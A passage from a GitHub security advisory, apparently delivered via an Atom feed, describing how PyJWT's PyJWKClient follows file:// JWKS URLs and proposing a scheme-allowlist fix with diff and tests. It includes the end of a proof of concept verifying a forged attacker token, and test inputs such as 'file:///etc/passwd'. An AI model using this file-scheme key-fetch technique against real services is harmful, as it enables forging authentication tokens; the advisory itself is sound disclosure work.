key_obj = client.get_signing_key_from_jwt(token)
decoded = pyjwt.decode(token, key_obj.key, algorithms=["RS256"],
                       audience="target-app")
print("Token verified:", decoded)
# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}
</code></pre>
<h2 id="cross-library-evidence--pyjwt-is-the-outlier">Cross-library evidence — PyJWT is the outlier</h2>
<p>The same composition pattern is structurally safe in 4 other mainstream JWT libraries:</p>
<table>
<thead>
<tr>
<th>Library</th>
<th>Behavior on <code>jku=file://...</code></th>
<th>Mechanism</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PyJWT 2.12.1</strong> (Python)</td>
<td><strong>Reads file from disk, parses, uses for signature verification</strong></td>
<td>urllib default OpenerDirector includes FileHandler</td>
</tr>
<tr>
<td>panva/jose 6.2.3 (Node.js)</td>
<td>Refuses pre-fetch</td>
<td>WHATWG <code>fetch()</code> rejects non-http(s) at fetch-spec layer</td>
</tr>
<tr>
<td>golang-jwt + MicahParks/keyfunc v3.4.0 (Go)</td>
<td>Refuses pre-fetch</td>
<td><code>http.DefaultTransport</code> only registers http/https</td>
</tr>
<tr>
<td>Microsoft.IdentityModel.Tokens 8.18.0 (.NET)</td>
<td>Refuses pre-fetch</td>
<td><code>HttpDocumentRetriever</code> defaults <code>RequireHttps=true</code></td>
</tr>
<tr>
<td>Spring Security NimbusJwtDecoder 6.3.4 (Java)</td>
<td>Refuses pre-fetch</td>
<td>URI parser delegation refuses non-http(s) at request build</td>
</tr>
</tbody></table>
<p>PyJWT is the only library of these 5 where the default behavior allows <code>file://</code> to reach the fetch layer.</p>
<h2 id="recommended-fix">Recommended fix</h2>
<p>Add <code>allowed_schemes: tuple[str, ...] = ("https", "http")</code> kwarg to <code>PyJWKClient.__init__</code>. Pre-validate URL scheme before invoking <code>urllib.request.urlopen</code>. URLs with disallowed schemes raise <code>PyJWKClientError</code> before any fetch is attempted.</p>
<h3 id="diff-sketch-against-jwtjwks_clientpy">Diff sketch against <code>jwt/jwks_client.py</code></h3>
<pre><code class="language-python">def __init__(
    self, uri: str,
    cache_keys: bool = False, max_cached_keys: int = 16,
    cache_jwk_set: bool = True, lifespan: float = 300,
    headers: dict[str, Any] | None = None, timeout: float = 30,
    ssl_context: SSLContext | None = None,
    allowed_schemes: tuple[str, ...] = ("https", "http"),  # NEW
):
    """...
    :param allowed_schemes: URL schemes the JWKS endpoint is permitted
        to use. Default ``("https", "http")``. Pass ``("https",)`` for
        HTTPS-only operation. URLs with disallowed schemes raise
        ``PyJWKClientError`` before any fetch is attempted.
    """
    # ... existing init code ...
    self.allowed_schemes = allowed_schemes
    self._validate_uri_scheme()


def _validate_uri_scheme(self) -&gt; None:
    """Reject the configured URI early if its scheme isn't allowed."""
    from urllib.parse import urlparse
    parsed = urlparse(self.uri)
    scheme = parsed.scheme.lower()
    if not scheme:
        raise PyJWKClientError(
            f"PyJWKClient URI '{self.uri}' has no scheme; expected one of "
            f"{self.allowed_schemes!r}")
    if scheme not in self.allowed_schemes:
        raise PyJWKClientError(
            f"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes "
            f"{self.allowed_schemes!r}; refusing to fetch from this URL")
</code></pre>
<h3 id="tests-to-add">Tests to add</h3>
<pre><code class="language-python">def test_pyjwkclient_rejects_file_scheme():
    with pytest.raises(PyJWKClientError, match="not in allowed_schemes"):
        PyJWKClient("file:///etc/passwd")

def test_pyjwkclient_rejects_ftp_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("ftp://example.org/keys.json")

def test_pyjwkclient_rejects_data_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient('data:application/json,{"keys":[]}')

def test_pyjwkclient_caller_can_lock_to_https_only():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("http://internal.test/jwks.json", allowed_schemes=("https",))
</code></pre>
<h3 id="compatibility">Compatibility</h3>
<ul>
<li>Default <code>allowed_schemes=("https", "http")</code> preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints</li>
<li>Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)</li>
<li>No changes to urllib fetch logic itself — the fix is a pre-validation gate</li>
</ul>
<h2 id="class-precedent">Class precedent</h2>
<p>This is the same class as <strong>CVE-2024-21643</strong> (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.</p>
<h2 id="prior-art-verified-2026-05-06">Prior art (verified 2026-05-06)</h2>
<p>Confirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):</p>
<ul>
<li>No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling</li>
<li>No existing GitHub issue or PR addressing scheme allowlisting</li>
<li>No silent fix in CHANGELOG through 2.12.1</li>
<li>5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Reported by Keijo Tuominen — independent security research at CMHT.tech (<a href="https://cmht.tech">https://cmht.tech</a>).</p>
<p>Reproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48522">https://nvd.nist.gov/vuln/detail/CVE-2026-48522</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml</a></li>
<li><a href="https://github.com/github/advisory-database/pull/8521">https://github.com/github/advisory-database/pull/8521</a></li>
<li><a href="https://github.com/advisories/GHSA-993g-76c3-p5m4">https://github.com/advisories/GHSA-993g-76c3-p5m4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-993g-76c3-p5m4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T19:28:41.000Z</published>
    </entry>
</feed>